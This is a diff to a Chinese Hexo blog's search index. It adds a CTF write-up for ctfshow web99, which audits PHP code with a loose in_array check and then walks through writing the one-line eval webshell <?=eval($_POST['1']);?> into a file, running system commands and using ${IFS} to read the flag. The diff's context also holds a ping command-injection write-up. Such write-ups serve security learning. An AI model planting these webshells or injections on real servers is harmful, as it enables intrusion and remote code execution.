@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>ctfshowweb99</title>
+      <link href="/2026/05/11/ctfshowweb99/"/>
+      <url>/2026/05/11/ctfshowweb99/</url>
+      
+        <content type="html"><![CDATA[<h1 id="1-代码审计"><a href="#1-代码审计" class="headerlink" title="1.代码审计"></a>1.代码审计</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();<span class="comment">//创建一个allow数组</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; <span class="comment">//遍历i=36到0x36d</span></span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));<span class="comment">//在1和i之间生成一个随机数，放入到数组中</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;<span class="comment">//如果get传参数n并且n在allow数组内</span></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);<span class="comment">//把post传入的content的内容写入到n传入的内容里面</span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>注：in_array()是存在若比较的，就是会先转变类型再进行比较 &#x2F;&#x2F;2.php-&gt;2</p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>我们先传入参数n&#x3D;2.php<br>content传入木马，等于把木马写入到了2.php文件内<br>content&#x3D;<?=eval($_POST['1']);?><br>访问2.php后post传参1&#x3D;system(‘ls’);<br>执行后可以看到flag36d.php文件<br>再用post传参1&#x3D;system(‘tac${IFS}flag36d.php’);<br>成功读取flag</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> php特性 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>ctfshow web入门信息收集学习记录</title>
       <link href="/2026/04/25/ctfshow-web%E5%85%A5%E9%97%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
       <url>/2026/04/25/ctfshow-web%E5%85%A5%E9%97%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
@@ -73,32 +92,6 @@
       <url>/2026/03/22/%E3%80%90Lit%20CTF2023%E3%80%91Ping%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
       
         <content type="html"><![CDATA[<p>[LitCTF 2023]Ping<br>ping命令的本质就是命令行拼接<br>输入ping127.0.0.1提示只能输入ip，再次尝试127.0.0.1发包成功，于是用管道拼接输入127.0.0.1|ls依旧提示输入ip，<br><img src="/images/1.png" alt="截图"></p><p>f12查看源码，有js检查ip，所以我们禁用js<br><img src="/images/2.jpg" alt="截图"><br><img src="/images/3.png" alt="截图"><br>继续拼接查看根目录<br><img src="/images/4.jpg" alt="截图"><br>拼接访问flag文件得到结果</p><p><img src="/images/5.jpg" alt="截图"></p>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>鎏妆盾构法突围</title>
-      <link href="/2026/03/10/%E9%8E%8F%E5%A6%86%E7%9B%BE%E6%9E%84%E6%B3%95%E7%AA%81%E5%9B%B4/"/>
-      <url>/2026/03/10/%E9%8E%8F%E5%A6%86%E7%9B%BE%E6%9E%84%E6%B3%95%E7%AA%81%E5%9B%B4/</url>
-      
-        <content type="html"><![CDATA[]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>Hello World</title>
-      <link href="/2026/03/10/hello-world/"/>
-      <url>/2026/03/10/hello-world/</url>
-      
-        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
       
       
       
